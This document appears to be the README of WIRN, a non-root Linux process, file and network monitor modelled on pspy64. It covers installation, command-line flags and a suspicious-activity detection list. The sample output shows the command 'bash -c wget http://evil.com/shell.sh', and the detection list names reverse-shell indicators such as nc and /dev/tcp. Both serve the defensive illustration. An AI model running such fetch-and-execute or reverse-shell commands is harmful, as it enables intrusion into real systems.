**WIRN** is an enhanced process monitoring tool inspired by pspy64, designed for security researchers, system administrators, and penetration testers. It monitors processes, file system events, and network connections without requiring root privileges.

## üåü Features

- **Advanced Process Monitoring**: Real-time detection of new processes with detailed information
- **Suspicious Activity Detection**: Automatically identifies potentially malicious commands and activities
- **File System Monitoring**: Track file modifications in sensitive directories
- **Network Connection Tracking**: Monitor TCP connections and states
- **Multiple Output Formats**: Plain text or JSON for easy parsing
- **Flexible Filtering**: Filter by user, command patterns, or suspicious activities only
- **Environment Variables**: Optional inclusion of process environment variables
- **No Root Required**: Works without elevated privileges (some features may be limited)
- **High Performance**: Configurable scan intervals for optimal resource usage

## üìã Requirements

- Linux operating system (kernel 2.6+)
- Go 1.19 or higher (for building)

## üöÄ Installation

### Quick Install (Recommended)

```bash
curl -sSL https://raw.githubusercontent.com/yourusername/wirn/main/install.sh | bash
```

### Manual Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/wirn.git
cd wirn

# Build the binary
go build -o wirn main.go

# Optional: Install system-wide
sudo cp wirn /usr/local/bin/
```

### Using Pre-built Binaries

Download the latest release from the [Releases](https://github.com/yourusername/wirn/releases) page:

```bash
wget https://github.com/yourusername/wirn/releases/latest/download/wirn-linux-amd64
chmod +x wirn-linux-amd64
sudo mv wirn-linux-amd64 /usr/local/bin/wirn
```

## üìñ Usage

### Basic Usage

```bash
# Monitor processes only (default)
./wirn

# Monitor processes and file system
./wirn -file

# Monitor processes and network connections
./wirn -net

# Monitor everything
./wirn -file -net
```

### Advanced Options

```bash
# Show only suspicious activities
./wirn -suspicious

# Filter by specific user
./wirn -user www-data

# Filter by command pattern (regex)
./wirn -cmd "bash|sh"

# Output to JSON format
./wirn -json

# Save output to file
./wirn -output /tmp/wirn.log

# Include environment variables
./wirn -env

# Set custom scan interval (milliseconds)
./wirn -interval 50

# Limit maximum events
./wirn -max 1000

# Quiet mode (no banner)
./wirn -quiet
```

### Real-World Examples

**1. Security Monitoring**
```bash
# Detect reverse shells and suspicious commands
./wirn -suspicious -output /var/log/wirn-security.log
```

**2. Web Server Monitoring**
```bash
# Monitor processes spawned by web server user
./wirn -user www-data -file -output /var/log/web-activity.log
```

**3. Incident Response**
```bash
# Comprehensive monitoring with JSON output for SIEM integration
./wirn -file -net -json -suspicious -output /var/log/wirn-ir.json
```

**4. Development/Debugging**
```bash
# Monitor specific application processes
./wirn -cmd "myapp" -env -interval 50
```

**5. Cron Job Analysis**
```bash
# Watch for scheduled task execution
./wirn -user root -suspicious
```

| `-proc` | `true` | Monitor processes |
| `-file` | `false` | Monitor file system events |
| `-net` | `false` | Monitor network connections |

## üîç Suspicious Activity Detection

WIRN automatically detects potentially malicious activities by scanning for:

- Reverse shell indicators (`nc`, `bash -i`, `/dev/tcp`)
- Code execution patterns (`python -c`, `perl -e`, `ruby -e`)
- File downloads (`wget`, `curl`)
- Base64 encoded payloads
- Suspicious file operations (`chmod 777`, operations in `/tmp`)
- Privilege escalation attempts (`sudo`, `su`, `passwd`)
- Persistence mechanisms (`crontab`, `systemctl`)

## üìä Output Formats

### Plain Text Output

```
[2025-10-19 14:23:45] PID: 12345 | PPID: 1234 | User: www-data
  ‚Ü≥ CMD: /bin/bash -c wget http://evil.com/shell.sh
  ‚Ü≥ CWD: /tmp
  ‚ö† SUSPICIOUS ACTIVITY DETECTED!
```

### JSON Output

```json
{
  "timestamp": "2025-10-19 14:23:45",
  "pid": 12345,
  "ppid": 1234,
  "user": "www-data",
  "command": "/bin/bash",
  "cmdline": "/bin/bash -c wget http://evil.com/shell.sh",
  "cwd": "/tmp",
  "suspicious": true
}
```

## üõ°Ô∏è Security Considerations

1. **Permissions**: WIRN works without root privileges but some features may be limited
2. **Performance**: Aggressive scanning intervals may impact system performance
3. **Evasion**: Advanced attackers may detect and evade process monitoring
4. **Privacy**: Be aware of local regulations when monitoring user activities

## üîß Troubleshooting

### Permission Denied Errors

Some `/proc` entries may not be readable without elevated privileges. This is normal and doesn't affect most monitoring capabilities.

### High CPU Usage

If WIRN consumes too much CPU, increase the `-interval` value:
```bash
./wirn -interval 500  # Scan every 500ms instead of 100ms
```

### Missing Events

For high-frequency process creation, reduce the interval:
```bash
./wirn -interval 10  # Very aggressive scanning
```
